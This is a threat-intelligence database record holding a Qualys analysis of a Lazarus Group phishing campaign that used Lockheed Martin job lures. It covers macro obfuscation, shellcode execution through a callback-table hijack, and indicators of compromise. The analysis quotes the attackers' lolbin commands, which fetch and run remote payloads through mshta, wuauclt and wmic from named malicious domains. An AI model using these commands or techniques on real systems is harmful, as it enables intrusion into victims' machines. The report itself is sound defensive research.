{
    "id": "4157fd4b-b66a-4d0b-b8a8-5a8b31e7a114",
    "created_at": "2023-01-12T14:58:57.0762Z",
    "updated_at": "2025-03-27T02:17:23.116931Z",
    "deleted_at": null,
    "sha1_hash": "5530e0bf90e2acbfda4fa09f8e86722c7337b775",
    "title": "2022-02-08 - LolZarus- Lazarus Group Incorporating Lolbins into Campaigns",
    "authors": "",
    "file_creation_date": "2022-05-28T17:43:36Z",
    "file_modification_date": "2022-05-28T17:43:36Z",
    "file_size": 916030,
    "plain_text": "# LolZarus: Lazarus Group Incorporating Lolbins into Campaigns\n\n**[blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)**\n\nAkshat Pradhan February 8, 2022\n\n_Qualys Threat Research has identified a new Lazarus campaign using employment phishing_\n_lures targeting the defence sector. The identified variants target job applicants for Lockheed_\n_Martin. This blog details the markers of this campaign, including macro content, campaign_\n_flow and phishing themes of our identified variants and older variants that have been_\n_attributed to Lazarus by other vendors._\n\nThe Qualys Research Team recently identified a new Lazarus campaign using employment\nphishing lures targeting the defence sector. The identified variants target job applicants for\nLockheed Martin Corporation, which is an American aerospace, arms, defence, information\nsecurity, and technology corporation. This is thematically similar to other observed variants\n[where Lazarus has posed as defence companies like Northrop Grumman and](https://www.northropgrumman.com/) [BAE Systems](https://www.baesystems.com/en/home)\n\n\n-----\n\nwith job openings. We refer to this campaign as LolZarus due to the use of different lolbins\nin observed samples, some of which are the lolbin’s first recorded usage by a well-known\nadversary.\n\n## Sample Analysis\n\nWe identified two phishing documents: “Lockheed_Martin_JobOpportunities.docx” and\n“Salary_Lockheed_Martin_job_opportunities_confidential.doc”. Both variants were authored\nby the same user, named “Mickey”. The methodology used for control flow hijack and the\nmacro content is similar across both samples.\n\n**MD5: a27a9324d282d920e495832933d486ee**\n\n**Name: Salary_Lockheed_Martin_job_opportunities_confidential.doc**\n\nFig1. LockHeed Recruitment Lure\nThe macro uses aliases to rename the APIs that it uses (fig. 2).\n\n\n-----\n\nFig2.\n\nRenamed API aliases.\nThe initial entry point for the macro is via the ActiveX Frame1_Layout to automatically\nexecute once ActiveX control is enabled (fig. 3).\n\nFig3. EntryPoint of\n\nobfuscated Macro.\nThe macro starts by loading WMVCORE.DLL, which is a legitimate windows dll for windows\nmedia. Interestingly, to make the macro seem more innocuous, Lazarus uses function names\nidentical to the exported functions of WMVCORE.DLL and variable names thematically\nrelated to playback (fig. 4).\n\nFig.4\n\nWMV playback variables and wmvcore.dll function names\nThe macro uses a check for a document variable before entering its main functionality block.\nThis variable is set at the end to ensure that subsequent opening of the document does not\nexecute it again.\n\n\n-----\n\nThe second stage payload is shellcode that is embedded as a base64 encoded string array\ninside the macro that is decoded by using CryptStringToBinaryW (fig. 5). Other variants have\nused the UuidFromStringA function to decode the embedded payload and write it to an\nexecutable Heap.\n\nFig.5 Payload decoded via CryptStringToBinaryW.\n\nThe decoded shellcode then overwrites the WMIsAvailableOffline function from\nWMVCORE.dll by retrieving its address and changing its memory permissions.\n\n\n-----\n\nFig.6 VirtualProtect and memcpy’s.\n\nThe callback to the shellcode is achieved by retrieving the KernelCallbackTable pointer from\nthe PEB structure of the current process via NtQueryInformationProcess, and then patching\nthe _fnDWORD pointer to point to WMIsAvailableOffline. Whenever winword makes any\ngraphical call, the shellcode executes. This technique to hijack control flow has also been\n[used by other sophisticated attackers such as FinFisher. Lazarus has also used other novel](https://www.microsoft.com/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/)\nmethods to execute shellcode such as by using the function EnumSystemLocalesA as a\ncallback to shellcode written to executable heap.\n\nThe macro then sets a document variable to ensure that subsequent runs would not execute\nthe shellcode decode and the KernelCllbackTable hijack again. It also retrieves a decoy\ndocument from https://markettrendingcenter[.]com/lk_job_oppor[.]docx and displays it (fig. 7.)\n\n\n-----\n\nFig.7 Decoy Document.\nThe shellcode mainly sets up a periodic beacon out to\n_https://markettrendingcenter[.]com/member[.]htm by creating a new staging folder_\n```\nC:\\WMAuthorization, writing a vbs file (WMVxEncd.vbs) to it, and creating a\n\n```\ncorresponding Scheduled task to run the vbs file every 20 minutes (fig. 8). shellObj is the\nWscript.Shell object that the vbs file uses to execute the beacon command.\n```\nshellObj.Run \"forfiles /p c:\\windows /m HelpPane.exe /c \"\"mshta\nC:\\WMAuthorization\\WMPlaybackSrv \"\"https://markettrendingcenter.com/member.htm\"\"\"\"\",\n0, True\n\n```\n\n-----\n\nFig.8 Schedule Task Dump\nHere, WMPlaybackSrv is a renamed wscript.exe and WindowsMediaPlayerVxEncdSrv is a\nrenamed mshta.exe. Another variant of the campaign uses the lolbin wuauclt.\n```\ncmd /C ''C:\\Windows\\system32\\wuauclt.exe' /UpdateDeploymentProvider wuaueng.dll\n/RunHandlerComServer\n\n```\nEarlier variants have used a copy of wmic.\n\n\n-----\n\n```\n%COMSPEC% /c Start /miN c:\\Intel\\hidasvc ENVIRONMENT get STATUS\n/FORMAT:”hxxps://www.advantims[.]com/GfxCPL.xsl”\n\n```\n[Additional vendors have also identified a variant that uses pcalua.exe.](https://twitter.com/_CPResearch_/status/1352310521752662018)\nUnfortunately, we were unable to get further details about the remote htm payload as it\nreturns a 404 error.\n\n## Conclusion\n\nWe attribute this campaign to Lazarus as there is significant overlap in the macro content,\ncampaign flow, and phishing themes of our identified variants as well as older variants that\n[have been attributed to Lazarus by other vendors. Additional vendors have reported on the](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)\n[current campaign while attributing it to Lazarus.](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)\n\nLazarus continues to evolve its capabilities by utilizing lesser-known shellcode execution\ntechniques and incorporating various lolbins as part of its campaign. Qualys will continue to\nmonitor for other similar phishing lures related to Lazarus.\n\nExisting customers of Qualys can use the following QQL’s to identify this activity:\n```\nmitre.attack.technique.id:”Q0026”\nmitre.attack.technique.id:”T1218.005”\nmitre.attack.technique.id:”T1202”\nmitre.attack.technique.id:”T1036.003”\nmitre.attack.technique.id:”T1059.005”\n\n## ATT&CK Mapping\n\n```\n[Phishing: Spearphishing Attachment T1566.001](https://attack.mitre.org/techniques/T1566/001/)\n\n[Windows Management Instrumentation (T1047)](https://attack.mitre.org/techniques/T1047/)\n\n[Masquerading: Rename System Utilities (T1036.003)](https://attack.mitre.org/techniques/T1036/003/)\n\n[Signed Binary Proxy Execution: Mshta (T1218.005)](https://attack.mitre.org/techniques/T1218/005/)\n\n[Command and Scripting Interpreter: Visual Basic (T1059.005)](https://attack.mitre.org/techniques/T1059/005/)\n\n[Scheduled Task/Job: Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005/)\n\n[Native API (T1106)](https://attack.mitre.org/techniques/T1106/)\n\n[Hijack Execution Flow (T1574)](https://attack.mitre.org/techniques/T1574/)\n\n[Command and Scripting Interpreter: Windows Command Shell (T1059.003)](https://attack.mitre.org/techniques/T1059/003/)\n\n## IOCS\n\nHashes\n\n\n-----\n\n```\ne87b575b2ddfb9d4d692e3b8627e3921\na27a9324d282d920e495832933d486ee\n3f326da2affb0f7f2a4c5c95ffc660cc\n490c885dc7ba0f32c07ddfe02a04bbb9\n712a8e4d3ce36d72ff74b785aaf18cb0\na27a9324d282d920e495832933d486ee\nf2a0e9034d67f8200993c4fa8e4f5d15\n\n```\nDomains\n\nmarkettrendingcenter.com\n\nlm-career.com\n\nadvantims.com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-08 - LolZarus- Lazarus Group Incorporating Lolbins into Campaigns.pdf"
    ],
    "report_names": [
        "2022-02-08 - LolZarus- Lazarus Group Incorporating Lolbins into Campaigns.pdf"
    ],
    "threat_actors": [
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535537,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1653759816,
    "ts_modification_date": 1653759816,
    "files": {
        "pdf": "https://archive.orkl.eu/5530e0bf90e2acbfda4fa09f8e86722c7337b775.pdf",
        "text": "https://archive.orkl.eu/5530e0bf90e2acbfda4fa09f8e86722c7337b775.txt",
        "img": "https://archive.orkl.eu/5530e0bf90e2acbfda4fa09f8e86722c7337b775.jpg"
    }
}